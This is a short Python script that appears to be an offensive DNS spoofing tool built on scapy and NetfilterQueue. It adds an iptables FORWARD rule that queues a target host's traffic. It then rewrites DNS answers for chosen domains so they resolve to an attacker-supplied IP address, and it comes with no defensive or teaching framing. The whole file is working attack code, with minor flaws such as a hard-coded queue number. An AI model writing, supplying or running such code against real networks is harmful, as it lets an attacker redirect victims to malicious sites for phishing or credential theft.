import os
from scapy.all import *
from netfilterqueue import NetfilterQueue
 
class DNSSpoof:
    def __init__(self, website, spoofIP, queueNum, targetIP):
        self.website = website
        self.spoofIP = spoofIP
        self.queueNum = queueNum
        self.targetIP = targetIP
        self.queue = NetfilterQueue()
        print self.website, self.spoofIP, self.targetIP
 
    def __call__(self):
        print("Spoofing....")
        forward = 'sudo iptables -I FORWARD -d '
        forward = forward + self.targetIP
        forward = forward + ' -j NFQUEUE --queue-num 1'
        os.system(forward)
        self.queue.bind(self.queueNum, self.poison)
        try:
            self.queue.run()
            print 'queue run: '
        except KeyboardInterrupt:
            os.system('sudo iptables -F FORWARD')
            print("[!] iptable rule flushed")
 
    def poison(self, packet):
        scapyPacket = IP(packet.get_payload())
        if scapyPacket.haslayer(DNSRR):
            try:
                queryName = scapyPacket[DNSQR].qname
                if queryName in self.website:
                    scapyPacket[DNS].an = DNSRR(
                        rrname=queryName, rdata=self.spoofIP)
                    scapyPacket[DNS].ancount = 1
                    del scapyPacket[IP].len
                    del scapyPacket[IP].chksum
                    del scapyPacket[UDP].len
                    del scapyPacket[UDP].chksum
                    print "modified", queryName
                    packet.set_payload(bytes(scapyPacket))
                else:
                    print("not modified")
                return packet.accept()
            except IndexError as error:
                print "index error"
        return packet.accept()
